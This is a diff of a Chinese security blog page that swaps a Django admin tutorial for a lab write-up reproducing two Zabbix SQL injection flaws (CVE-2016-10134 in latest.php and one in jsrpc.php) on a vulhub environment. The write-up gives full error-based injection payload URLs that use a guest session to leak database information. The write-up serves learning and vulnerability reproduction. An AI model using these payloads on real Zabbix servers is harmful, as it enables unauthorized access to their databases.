@@ -79,17 +79,21 @@
 
 
 
-<meta name="description" content="Admin 简介  Admin 是 Django 自带的一个功能强大的自动化数据管理界面被授权的用户可直接在 Admin 中管理数据库Django 提供许多针对 Admin 的定制功能   Admin 配置  cmd 创建 admin 用户执行 python manage.py createsuperuser密码：admin123..admin 入口：localhost:8000/admin/默">
+<meta name="description" content="环境搭建好才发现vulhub上已经有了，这里还是使用vulhub进行漏洞复现，自己搭建环境的话需要开启guest访问权限 Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）启动环境   docker-compose up -d  漏洞复现访问http://ip:8080，用账号guest（密码为空）登录游客账户登录后，查看Cookie中的zbx_sessioni">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Django--（admin）">
-<meta property="og:url" content="http://wcute.github.io/2018/12/10/Django--（admin）/index.html">
+<meta property="og:title" content="zabbix  SQL注入漏洞复现">
+<meta property="og:url" content="http://wcute.github.io/2018/12/21/zabbix  SQL注入漏洞复现/index.html">
 <meta property="og:site_name" content="鸡翅儿">
-<meta property="og:description" content="Admin 简介  Admin 是 Django 自带的一个功能强大的自动化数据管理界面被授权的用户可直接在 Admin 中管理数据库Django 提供许多针对 Admin 的定制功能   Admin 配置  cmd 创建 admin 用户执行 python manage.py createsuperuser密码：admin123..admin 入口：localhost:8000/admin/默">
+<meta property="og:description" content="环境搭建好才发现vulhub上已经有了，这里还是使用vulhub进行漏洞复现，自己搭建环境的话需要开启guest访问权限 Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）启动环境   docker-compose up -d  漏洞复现访问http://ip:8080，用账号guest（密码为空）登录游客账户登录后，查看Cookie中的zbx_sessioni">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-10T14:11:20.215Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-389af9c28223d7d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-85700702d5aaa2f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-9925ef38f777fcee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-21T06:35:41.151Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Django--（admin）">
-<meta name="twitter:description" content="Admin 简介  Admin 是 Django 自带的一个功能强大的自动化数据管理界面被授权的用户可直接在 Admin 中管理数据库Django 提供许多针对 Admin 的定制功能   Admin 配置  cmd 创建 admin 用户执行 python manage.py createsuperuser密码：admin123..admin 入口：localhost:8000/admin/默">
+<meta name="twitter:title" content="zabbix  SQL注入漏洞复现">
+<meta name="twitter:description" content="环境搭建好才发现vulhub上已经有了，这里还是使用vulhub进行漏洞复现，自己搭建环境的话需要开启guest访问权限 Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）启动环境   docker-compose up -d  漏洞复现访问http://ip:8080，用账号guest（密码为空）登录游客账户登录后，查看Cookie中的zbx_sessioni">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-389af9c28223d7d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -119,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://wcute.github.io/2018/12/10/Django--（admin）/">
+  <link rel="canonical" href="http://wcute.github.io/2018/12/21/zabbix  SQL注入漏洞复现/">
 
 
 
 
 
-  <title>Django--（admin） | 鸡翅儿</title>
+  <title>zabbix  SQL注入漏洞复现 | 鸡翅儿</title>
   
 
 
@@ -252,7 +256,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/10/Django--（admin）/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/21/zabbix  SQL注入漏洞复现/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -269,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Django--（admin）</h1>
+          <h1 class="post-title" itemprop="name headline">zabbix  SQL注入漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -281,8 +285,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-10T12:33:03+08:00">
-                2018-12-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-21T14:34:25+08:00">
+                2018-12-21
               </time>
             
 
@@ -304,8 +308,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
                   </a>
                 </span>
 
@@ -341,28 +345,12 @@
       
 
       
-        <ul>
-<li><p>Admin 简介</p>
-<blockquote>
-<p>Admin 是 Django 自带的一个功能强大的自动化数据管理界面<br>被授权的用户可直接在 Admin 中管理数据库<br>Django 提供许多针对 Admin 的定制功能</p>
+        <p>环境搭建好才发现vulhub上已经有了，这里还是使用vulhub进行漏洞复现，自己搭建环境的话需要开启<code>guest</code>访问权限</p>
+<h3 id="Zabbix-SQL-latest-php-注入漏洞（CVE-2016-10134）"><a href="#Zabbix-SQL-latest-php-注入漏洞（CVE-2016-10134）" class="headerlink" title="Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）"></a>Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）</h3><h4 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h4><blockquote>
+<p>  docker-compose up -d</p>
 </blockquote>
-</li>
-<li><p>Admin 配置</p>
-<blockquote>
-<p>cmd 创建 admin 用户<br>执行 python manage.py createsuperuser<br>密码：admin123..<br>admin 入口：localhost:8000/admin/<br>默认英文界面，修改 settings.py 中的 LANGUAGE_CODE = ‘zh_Hans’ 可变更中文界面</p>
-</blockquote>
-</li>
-<li><p>配置应用</p>
-<blockquote>
-<p>在应用下 admin.py 中引入应用自身的 models 模块（或里面的模型类）<br>编辑 admin.py :<br>from django.contrib import admin<br>from models import Article<br>admin.site.register(Article)</p>
-</blockquote>
-</li>
-<li><p>修改数据默认显示名称</p>
-<blockquote>
-<p>在 models.py 的 Article 类中添加一个方法<br>python3 使用 def <strong>str</strong>(self):<br>return self.title<br>python2 使用 def <strong>unicode</strong>(self):<br>return self.title</p>
-</blockquote>
-</li>
-</ul>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问<code>http://ip:8080</code>，用账号<code>guest</code>（密码为空）登录游客账户<br>登录后，查看Cookie中的<code>zbx_sessionid</code>，复制后16位字符<br><img src="https://upload-images.jianshu.io/upload_images/12585049-389af9c28223d7d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>payload：zabbix/latest.php?output=ajax&amp;sid=caeaeefde7aafed5&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)<br><img src="https://upload-images.jianshu.io/upload_images/12585049-85700702d5aaa2f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h3 id="Zabbix-SQL-jsrpc-php-注入漏洞"><a href="#Zabbix-SQL-jsrpc-php-注入漏洞" class="headerlink" title="Zabbix SQL(jsrpc.php) 注入漏洞"></a>Zabbix SQL(jsrpc.php) 注入漏洞</h3><p>漏洞产生原因：<code>profileIdx2</code> 参数没有被过滤<br>利用条件：<code>guest</code>用户开启，允许访问<br>影响版本：<code>2.0.x</code>| <code>2.2.x</code>| <code>2.4.x</code>| <code>3.0.0-3.0.3</code><br>payload：zabbix/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9925ef38f777fcee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
 
       
     </div>
@@ -387,8 +375,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/09/CSRF漏洞学习/" rel="next" title="CSRF漏洞学习">
-                <i class="fa fa-chevron-left"></i> CSRF漏洞学习
+              <a href="/2018/12/10/Django--（Models）/" rel="next" title="Django--（Models）">
+                <i class="fa fa-chevron-left"></i> Django--（Models）
               </a>
             
           </div>
@@ -397,8 +385,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/10/Django--（Templates）/" rel="prev" title="Django--（Templates）">
-                Django--（Templates） <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/21/Zabbix（分布式系统监视）漏洞学习/" rel="prev" title="Zabbix（分布式系统监视）漏洞学习">
+                Zabbix（分布式系统监视）漏洞学习 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -451,8 +439,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -503,6 +500,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Zabbix-SQL-latest-php-注入漏洞（CVE-2016-10134）"><span class="nav-number">1.</span> <span class="nav-text">Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#启动环境"><span class="nav-number">1.1.</span> <span class="nav-text">启动环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Zabbix-SQL-jsrpc-php-注入漏洞"><span class="nav-number">2.</span> <span class="nav-text">Zabbix SQL(jsrpc.php) 注入漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
